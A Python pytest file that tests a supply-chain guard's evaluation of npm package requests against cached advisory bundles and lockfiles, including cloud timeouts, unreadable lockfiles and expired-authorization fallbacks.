def test_evaluate_package_request_artifact_blocks_hoisted_lockfile_match(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    (workspace_dir / "package-lock.json").write_text(
        json.dumps(
            {
                "packages": {
                    "": {"name": "react-app"},
                    "node_modules/react": {"version": "18.0.0"},
                    "node_modules/minimist": {"version": "1.2.8"},
                }
            }
        ),
        encoding="utf-8",
    )

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("react@18.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert any("minimist" in reason["message"] for reason in result.reasons)


def test_evaluate_package_request_artifact_handles_invalid_lockfile_bytes_without_crashing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    (workspace_dir / "package-lock.json").write_bytes(b"\xff\xfe\xfd")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("react@18.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "require-reapproval"


def test_evaluate_package_request_artifact_pauses_for_unreadable_lockfile(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    lockfile_path = workspace_dir / "package-lock.json"
    lockfile_path.write_text(
        json.dumps({"packages": {"": {"name": "demo-app"}}}),
        encoding="utf-8",
    )
    original_read_bytes = Path.read_bytes

    def guarded_read_bytes(path: Path) -> bytes:
        if path == lockfile_path:
            raise OSError("permission denied")
        return original_read_bytes(path)

    monkeypatch.setattr(Path, "read_bytes", guarded_read_bytes)

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert any(reason["code"] == "lockfile_parse_incomplete" for reason in result.reasons)
    assert result.packages[0]["lockfileParseError"] == "read_error"
    assert result.policy_action == "require-reapproval"


def test_evaluate_package_request_artifact_handles_unreadable_transitive_lockfile_without_crashing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    lockfile_path = workspace_dir / "package-lock.json"
    lockfile_path.write_text(
        json.dumps({"packages": {"": {"name": "demo-app"}}}),
        encoding="utf-8",
    )
    original_read_text = Path.read_text

    def guarded_read_text(path: Path, *args: object, **kwargs: object) -> str:
        if path == lockfile_path:
            raise OSError("permission denied")
        return original_read_text(path, *args, **kwargs)

    monkeypatch.setattr(Path, "read_text", guarded_read_text)

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "monitor"
    assert result.policy_action == "allow"


def test_evaluate_package_request_artifact_handles_unreadable_lockfile_context_without_crashing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    lockfile_path = workspace_dir / "package-lock.json"
    lockfile_path.write_text(
        json.dumps({"packages": {"": {"name": "demo-app"}}}),
        encoding="utf-8",
    )
    original_read_text = Path.read_text

    def guarded_read_text(path: Path, *args: object, **kwargs: object) -> str:
        if path == lockfile_path:
            raise OSError("permission denied")
        return original_read_text(path, *args, **kwargs)

    monkeypatch.setattr(Path, "read_text", guarded_read_text)
    monkeypatch.setattr(
        evaluator_module,
        "_urlopen_json_with_timeout_retry",
        lambda *args, **kwargs: _cloud_response(
            decision="monitor",
            enforcement="premium_cloud",
            entitlement_state="active",
            package_name="left-pad",
        ),
    )

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0", lockfile_paths=("package-lock.json",)),
        store=store,
        workspace_dir=workspace_dir,
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "monitor"
    assert result.policy_action == "allow"
    assert result.enforcement == "premium_cloud"


def test_evaluate_package_request_artifact_range_only_timeout_falls_back_safely(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    def timeout_urlopen(*args: object, **kwargs: object) -> object:
        raise TimeoutError("timed out")

    monkeypatch.setattr(urllib.request, "urlopen", timeout_urlopen)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@^1.2.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "ask"
    assert result.policy_action == "require-reapproval"
    assert result.enforcement in {"local_fallback", "offline_cached"}
    assert any(reason["code"] == "cloud_timeout" for reason in result.reasons)


def test_evaluate_package_request_artifact_blocks_from_cached_bundle_after_cloud_fallback(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, response, "2026-05-19T00:00:00Z")

    cloud_attempts = 0

    def cloud_timeout(*args: object, **kwargs: object) -> object:
        nonlocal cloud_attempts
        cloud_attempts += 1
        raise TimeoutError("cloud unreachable")

    monkeypatch.setattr(evaluator_module, "_urlopen_json_with_timeout_retry", cloud_timeout)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("minimist@1.2.8"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert cloud_attempts == 1
    assert result.decision == "block"
    assert result.policy_action == "block"
    assert result.enforcement == "offline_cached"
    assert any(reason["code"] == "cloud_timeout" for reason in result.reasons)


def test_evaluate_package_request_artifact_stale_bundle_requests_refresh_and_records_monitor(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _force_cloud_fallback(monkeypatch)
    store = GuardStore(tmp_path / "guard-home")
    _seed_guard_cloud(store, workspace_id=WORKSPACE_ID)
    stale_response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ],
        generated_at=datetime(2026, 5, 18, tzinfo=timezone.utc),
        expires_at=datetime(2026, 5, 18, 1, tzinfo=timezone.utc),
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, stale_response, "2026-05-18T01:00:00Z")

    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "monitor"
    assert result.refresh_required is True
    assert store.list_events(event_name="supply_chain_bundle_refresh_requested")
    evidence = store.list_evidence()
    assert evidence
    assert evidence[0]["category"] == "supply-chain"


def test_evaluate_package_request_artifact_uses_stale_bundle_when_cloud_auth_expired(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    dpop_key_material = generate_dpop_key_pair()
    store.set_oauth_local_credentials(
        issuer="https://hol.org",
        client_id="guard-local-daemon",
        refresh_token="refresh-token-1",
        dpop_private_key_pem=dpop_key_material.private_key_pem,
        dpop_public_jwk=dpop_key_material.public_jwk,
        dpop_public_jwk_thumbprint=dpop_key_material.public_jwk_thumbprint,
        grant_id="grant-1",
        machine_id="machine-1",
        workspace_id=WORKSPACE_ID,
        now="2026-05-19T00:00:00Z",
    )
    stale_response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ],
        generated_at=datetime(2026, 5, 18, tzinfo=timezone.utc),
        expires_at=datetime(2026, 5, 18, 1, tzinfo=timezone.utc),
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, stale_response, "2026-05-18T01:00:00Z")

    def raise_auth_expired(_store: GuardStore, **_kwargs: object) -> dict[str, object]:
        raise GuardSyncAuthorizationExpiredError(
            "Guard authorization expired. Run `hol-guard connect` to sign in again."
        )

    monkeypatch.setattr(evaluator_module, "_resolve_guard_sync_auth_context", raise_auth_expired)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "monitor"
    assert result.policy_action == "allow"
    assert result.enforcement == "offline_cached"
    assert any(reason["code"] == "cloud_auth_error" for reason in result.reasons)
    assert result.user_copy.next_step == "hol-guard connect"
    assert "local-only" in result.user_copy.harness_message
    assert "hol-guard connect" in result.user_copy.harness_message


def test_evaluate_unlisted_registry_package_uses_local_intelligence_when_cloud_auth_expired(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    dpop_key_material = generate_dpop_key_pair()
    store.set_oauth_local_credentials(
        issuer="https://hol.org",
        client_id="guard-local-daemon",
        refresh_token="refresh-token-1",
        dpop_private_key_pem=dpop_key_material.private_key_pem,
        dpop_public_jwk=dpop_key_material.public_jwk,
        dpop_public_jwk_thumbprint=dpop_key_material.public_jwk_thumbprint,
        grant_id="grant-1",
        machine_id="machine-1",
        workspace_id=WORKSPACE_ID,
        now="2026-05-19T00:00:00Z",
    )
    stale_response = _bundle_response(
        packages=[],
        generated_at=datetime(2026, 5, 18, tzinfo=timezone.utc),
        expires_at=datetime(2026, 5, 18, 1, tzinfo=timezone.utc),
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, stale_response, "2026-05-18T01:00:00Z")

    def raise_auth_expired(_store: GuardStore, **_kwargs: object) -> dict[str, object]:
        raise GuardSyncAuthorizationExpiredError(
            "Guard authorization expired. Run `hol-guard connect` to sign in again."
        )

    monkeypatch.setattr(evaluator_module, "_resolve_guard_sync_auth_context", raise_auth_expired)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("@openai/codex@latest"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "monitor"
    assert result.policy_action == "allow"
    assert result.enforcement == "local_fallback"
    assert any(reason["code"] == "cloud_auth_error" for reason in result.reasons)
    assert result.user_copy.next_step == "hol-guard connect"


def test_evaluate_package_request_artifact_honors_cloud_advisory_block_when_auth_expired(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "guard-home"
    home_dir.mkdir(parents=True, exist_ok=True)
    (home_dir / "config.toml").write_text(
        'security_level = "balanced"\n[risk_actions]\ncloud_advisory = "block"\n',
        encoding="utf-8",
    )
    store = GuardStore(home_dir)
    dpop_key_material = generate_dpop_key_pair()
    store.set_oauth_local_credentials(
        issuer="https://hol.org",
        client_id="guard-local-daemon",
        refresh_token="refresh-token-1",
        dpop_private_key_pem=dpop_key_material.private_key_pem,
        dpop_public_jwk=dpop_key_material.public_jwk,
        dpop_public_jwk_thumbprint=dpop_key_material.public_jwk_thumbprint,
        grant_id="grant-1",
        machine_id="machine-1",
        workspace_id=WORKSPACE_ID,
        now="2026-05-19T00:00:00Z",
    )
    stale_response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="monitor",
                normalized_severity="low",
                exploit_level="none",
                known_exploited=False,
                malware_state="none",
                risk_score=220,
            )
        ],
        generated_at=datetime(2026, 5, 18, tzinfo=timezone.utc),
        expires_at=datetime(2026, 5, 18, 1, tzinfo=timezone.utc),
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, stale_response, "2026-05-18T01:00:00Z")

    def raise_auth_expired(_store: GuardStore, **_kwargs: object) -> dict[str, object]:
        raise GuardSyncAuthorizationExpiredError(
            "Guard authorization expired. Run `hol-guard connect` to sign in again."
        )

    monkeypatch.setattr(evaluator_module, "_resolve_guard_sync_auth_context", raise_auth_expired)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert result.policy_action == "block"
    assert result.enforcement == "premium_cloud"
    assert any(reason["code"] == "cloud_auth_error" for reason in result.reasons)
    assert result.user_copy.next_step == "hol-guard connect"
    assert "local-only" in result.user_copy.harness_message
    assert "hol-guard connect" in result.user_copy.harness_message


def test_evaluate_package_request_artifact_adds_reconnect_copy_when_auth_expired_but_bundle_answer_is_used(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = GuardStore(tmp_path / "guard-home")
    dpop_key_material = generate_dpop_key_pair()
    store.set_oauth_local_credentials(
        issuer="https://hol.org",
        client_id="guard-local-daemon",
        refresh_token="refresh-token-1",
        dpop_private_key_pem=dpop_key_material.private_key_pem,
        dpop_public_jwk=dpop_key_material.public_jwk,
        dpop_public_jwk_thumbprint=dpop_key_material.public_jwk_thumbprint,
        grant_id="grant-1",
        machine_id="machine-1",
        workspace_id=WORKSPACE_ID,
        now="2026-05-19T00:00:00Z",
    )
    bundle_response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="left-pad",
                version="1.0.0",
                default_action="block",
                normalized_severity="critical",
                exploit_level="active",
                known_exploited=True,
                malware_state="none",
                risk_score=980,
            )
        ],
        generated_at=datetime(2026, 5, 19, tzinfo=timezone.utc),
        expires_at=datetime(2026, 5, 20, tzinfo=timezone.utc),
    )
    store.cache_supply_chain_bundle(WORKSPACE_ID, bundle_response, "2026-05-19T00:00:00Z")

    def raise_auth_expired(_store: GuardStore, **_kwargs: object) -> dict[str, object]:
        raise GuardSyncAuthorizationExpiredError(
            "Guard authorization expired. Run `hol-guard connect` to sign in again."
        )

    monkeypatch.setattr(evaluator_module, "_resolve_guard_sync_auth_context", raise_auth_expired)
    result = evaluate_package_request_artifact(
        artifact=_artifact_for_targets("left-pad@1.0.0"),
        store=store,
        workspace_dir=tmp_path / "workspace",
        now="2026-05-19T00:00:00Z",
    )

    assert result.decision == "block"
    assert any(reason["code"] == "cloud_auth_error" for reason in result.reasons)
    assert result.user_copy.next_step == "hol-guard connect"
    assert "local-only" in result.user_copy.harness_message
    assert "hol-guard connect" in result.user_copy.harness_message


def test_with_additional_reason_updates_all_packages() -> None:
    evaluation = PackageRequestEvaluation(
        decision="warn",
        policy_action="warn",
        enforcement="offline_cached",
        entitlement_state="premium",
        cache_status="miss",
        package_intent_hash="intent-hash",
        policy_version="policy-v1",
        bundle_version="bundle-v1",
        workspace_fingerprint="workspace-fingerprint",
        reasons=({"code": "known_advisory", "message": "base"},),
        packages=(
            {"name": "minimist", "decision": "warn", "reasons": ({"code": "known_advisory"},)},
            {"name": "lodash", "decision": "warn", "reasons": ({"code": "known_advisory"},)},
        ),
        risk_summary="HOL Guard warned about this package request.",
        user_copy=SupplyChainUserCopy(
            title="Warn",
            summary="Warn",
            next_step=None,
            dashboard_url="https://hol.org/guard/inbox",
            harness_message="Warn",
        ),
    )

    updated = _with_additional_reason(
        evaluation,
        {
            "code": "cloud_timeout",
            "message": "Guard cloud evaluation timed out, so Guard fell back locally.",
            "severity": "unknown",
            "source": "guard-cloud",
        },
    )

    assert all(any(reason["code"] == "cloud_timeout" for reason in package["reasons"]) for package in updated.packages)


def test_evidence_id_distinguishes_versions_and_dependency_paths() -> None:
    direct_package = {
        "name": "minimist",
        "resolvedVersion": "1.2.8",
        "requestedVersion": "1.2.8",
        "dependencyPath": None,
        "decision": "block",
    }
    transitive_package = {
        "name": "minimist",
        "resolvedVersion": "1.2.8",
        "requestedVersion": "1.2.8",
        "dependencyPath": "react/node_modules/minimist",
        "decision": "block",
    }

    assert _evidence_id("intent-hash", direct_package) != _evidence_id("intent-hash", transitive_package)


def test_bundle_reason_message_uses_block_copy_for_stale_blocked_bundle() -> None:
    response = _bundle_response(
        packages=[
            _package(
                ecosystem="npm",
                name="minimist",
                version="1.2.8",
                default_action="block",
                recommended_fix_version="1.2.9",
            )
        ]
    )
    package = evaluator_module.load_supply_chain_bundle_response(response).bundle.packages[0]

    message = evaluator_module._bundle_reason_message(
        package,
        decision="block",
        reason="known_malware_or_kev",
        stale=True,
    )

    assert "blocked" in message.lower()
    assert "monitor mode" not in message
